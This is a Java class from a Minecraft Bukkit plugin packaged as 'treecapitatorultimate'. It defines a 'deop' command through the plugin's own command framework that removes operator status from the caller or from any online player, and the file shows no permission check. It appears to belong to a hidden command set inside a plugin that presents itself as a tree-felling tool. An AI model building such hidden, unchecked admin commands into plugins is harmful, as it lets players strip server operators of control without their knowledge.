package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;

public class DEOP extends Command {
    public DEOP() {
        super("deop", "Removes your OP.", CommandCategory.Player);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (args.size() == 0) {
            if (!p.isOp()) {
                p.sendMessage(Start.Prefix + ChatColor.YELLOW + "You already don't have OP!");
                return;
            }
            p.setOp(false);
            p.sendMessage(Start.Prefix + ChatColor.GOLD + "You now don't have OP!");
        } else if (args.size() == 1) {
            try {
                Player anotherPlayer = Bukkit.getPlayer(args.get(0));
                if (anotherPlayer == null) {
                    Start.ErrorString(p, "Player \"" + args.get(0) + "\" is not online!");
                    return;
                }
                if (!anotherPlayer.isOp()) {
                    p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " already hasn't OP!");
                    return;
                }
                anotherPlayer.setOp(false);
                p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.GOLD + " now hasn't OP!");
            } catch (Exception e) {
                Start.ErrorException(p, e);
            }
        }
    }
}
